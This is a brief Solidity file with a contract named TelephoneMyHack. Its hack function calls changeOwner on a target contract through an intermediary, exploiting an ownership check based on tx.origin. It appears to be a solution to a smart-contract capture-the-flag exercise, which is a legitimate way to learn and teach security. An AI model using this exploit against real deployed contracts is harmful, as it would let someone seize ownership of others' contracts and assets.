// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
   function changeOwner(address) external;
}

contract TelephoneMyHack {
    function hack(address attacked) public {
        ITelephone(attacked).changeOwner(msg.sender);
    }
}
